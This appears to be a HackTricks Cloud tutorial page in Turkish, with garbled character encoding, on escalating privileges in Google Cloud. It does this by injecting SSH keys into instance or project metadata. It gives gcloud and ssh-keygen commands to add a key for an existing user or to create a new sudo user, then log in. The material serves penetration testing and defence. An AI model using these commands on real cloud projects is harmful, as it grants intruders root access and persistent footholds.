# GCP - Ã–zel SSH Meta Verisi Ekleme

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'Ä± **takip edin**.
* Hacking hilelerinizi gÃ¶ndererek HackTricks ve HackTricks Cloud github reposuna **PR gÃ¶ndererek** hilelerinizi paylaÅŸÄ±n.

</details>

## Meta verisinin deÄŸiÅŸtirilmesi <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

Bir Ã¶rneÄŸin meta verilerinin deÄŸiÅŸtirilmesi, **bir saldÄ±rganÄ±n gerekli izinlere sahip olmasÄ± durumunda Ã¶nemli gÃ¼venlik risklerine yol aÃ§abilir**.

### **Ã–zel Meta Verilerine SSH AnahtarlarÄ±nÄ±n Eklenmesi**

GCP'de, **Linux sistemleri** genellikle [Google Compute Engine iÃ§in Python Linux Konuk OrtamÄ±](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts) tarafÄ±ndan betikler Ã§alÄ±ÅŸtÄ±rÄ±r. Bunun Ã¶nemli bir bileÅŸeni, **yetkilendirilmiÅŸ SSH genel anahtarlarÄ±nÄ±n gÃ¼ncellemelerini dÃ¼zenli olarak kontrol etmek** iÃ§in Ã¶rnek meta veri uÃ§ noktasÄ±nÄ± denetleyen [hesaplar daemonu](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)'udur.

Bu nedenle, bir saldÄ±rgan Ã¶zel meta verileri deÄŸiÅŸtirebilirse, daemon yeni bir genel anahtar bulacak ve bu anahtar **yerel sisteme entegre edilecektir**. Anahtar, mevcut bir kullanÄ±cÄ±nÄ±n `~/.ssh/authorized_keys` dosyasÄ±na veya anahtarÄ±n biÃ§imine baÄŸlÄ± olarak **sudo ayrÄ±calÄ±klarÄ±na sahip yeni bir kullanÄ±cÄ± oluÅŸturulmasÄ±na** eklenecektir. Ve saldÄ±rgan, ana bilgisayarÄ± ele geÃ§irebilecektir.

### **Varolan ayrÄ±calÄ±klÄ± kullanÄ±cÄ±ya SSH anahtarÄ± eklemek**

1. **Ã–rnekteki Varolan SSH AnahtarlarÄ±nÄ± Ä°nceleyin:**
- Ã–rneÄŸi ve meta verilerini aÃ§Ä±klayan komutu Ã§alÄ±ÅŸtÄ±rarak mevcut SSH anahtarlarÄ±nÄ± bulun. Ä°lgili bÃ¶lÃ¼m Ã§Ä±ktÄ±da `metadata` altÄ±nda olacak, Ã¶zellikle `ssh-keys` anahtarÄ±.
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
- SSH anahtarlarÄ±nÄ±n biÃ§imine dikkat edin: kullanÄ±cÄ± adÄ±, iki nokta Ã¼st Ã¼ste ile ayrÄ±lan anahtarÄ±n Ã¶nÃ¼nde yer alÄ±r.

2. **SSH Anahtar Meta Verisi Ä°Ã§in Bir Metin DosyasÄ± HazÄ±rlayÄ±n:**
- KullanÄ±cÄ± adlarÄ±nÄ±n ve bunlara karÅŸÄ±lÄ±k gelen SSH anahtarlarÄ±nÄ±n ayrÄ±ntÄ±larÄ±nÄ± `meta.txt` adlÄ± bir metin dosyasÄ±na kaydedin. Bu, yeni anahtarlarÄ± eklerken mevcut anahtarlarÄ± korumak iÃ§in Ã¶nemlidir.

3. **Hedef KullanÄ±cÄ± Ä°Ã§in Yeni Bir SSH AnahtarÄ± OluÅŸturun (bu Ã¶rnekte `alice`):**
- Yeni bir SSH anahtarÄ± oluÅŸturmak iÃ§in `ssh-keygen` komutunu kullanÄ±n ve yorum alanÄ±nÄ±n (`-C`) hedef kullanÄ±cÄ± adÄ±yla eÅŸleÅŸtiÄŸinden emin olun.
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
- Yeni genel anahtarÄ±, Ã¶rneÄŸin meta verilerinde bulunan formata benzeyerek `meta.txt`'ye ekleyin.

4. **Ã–rneÄŸin SSH Anahtar Meta Verisini GÃ¼ncelleyin:**
- GÃ¼ncellenmiÅŸ SSH anahtar meta verisini `gcloud compute instances add-metadata` komutunu kullanarak Ã¶rneÄŸe uygulayÄ±n.
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```

5. **Yeni SSH AnahtarÄ± Kullanarak Ã–rneÄŸe EriÅŸin:**
- Yeni anahtar kullanarak SSH ile Ã¶rneÄŸe baÄŸlanÄ±n ve hedef kullanÄ±cÄ±nÄ±n baÄŸlamÄ±nda kabuÄŸa eriÅŸin (bu Ã¶rnekte `alice`).
```bash
ssh -i ./key alice@localhost
sudo id
```

### **Yeni bir ayrÄ±calÄ±klÄ± kullanÄ±cÄ± oluÅŸturun ve bir SSH anahtarÄ± ekleyin**

EÄŸer ilginÃ§ bir kullanÄ±cÄ± bulunamazsa, `sudo` ayrÄ±calÄ±klarÄ±na sahip yeni bir kullanÄ±cÄ± oluÅŸturmak mÃ¼mkÃ¼ndÃ¼r:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### Proje dÃ¼zeyinde SSH anahtarlarÄ± <a href="#sshing-around" id="sshing-around"></a>

Bir bulut ortamÄ±nda **proje dÃ¼zeyinde SSH eriÅŸimini geniÅŸletmek** iÃ§in SSH anahtarlarÄ±nÄ± proje dÃ¼zeyine uygulamak mÃ¼mkÃ¼ndÃ¼r. Bu yaklaÅŸÄ±m, proje genelinde SSH eriÅŸimine izin veren herhangi bir Ã¶rneÄŸe SSH eriÅŸimine olanak tanÄ±r. Ä°ÅŸte Ã¶zetlenmiÅŸ bir rehber:

1. **Proje DÃ¼zeyinde SSH AnahtarlarÄ± Uygulama:**
- `gcloud compute project-info add-metadata` komutunu kullanarak `meta.txt` dosyasÄ±ndaki SSH anahtarlarÄ±nÄ± projenin meta verilerine ekleyin. Bu iÅŸlem, SSH anahtarlarÄ±nÄ±n projedeki tÃ¼m Ã¶rneklerde tanÄ±nmasÄ±nÄ± saÄŸlar, ancak bir Ã¶rnekte "Proje genelinde SSH anahtarlarÄ±nÄ± engelle" seÃ§eneÄŸi etkinleÅŸtirilmiÅŸse bu durum geÃ§erli olmaz.
```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **Proje Genelinde AnahtarlarÄ± Kullanarak Ã–rneklerde SSH Yapma:**
- Proje genelinde SSH anahtarlarÄ± kullanÄ±ldÄ±ÄŸÄ±nda, projenin herhangi bir Ã¶rneÄŸine SSH yapabilirsiniz. Proje genelinde anahtarlarÄ± engellemeyen Ã¶rnekler, SSH anahtarÄ±nÄ± kabul ederek eriÅŸim saÄŸlar.
- Bir Ã¶rneÄŸe doÄŸrudan SSH yapmanÄ±n bir yolu, `gcloud compute ssh [Ã–RNEK]` komutunu kullanmaktÄ±r. Bu komut, mevcut kullanÄ±cÄ± adÄ±nÄ±zÄ± ve projenin dÃ¼zeyinde ayarlanan SSH anahtarlarÄ±nÄ± kullanarak eriÅŸim denemesi yapar.


# Referanslar
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da** takip edin.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>
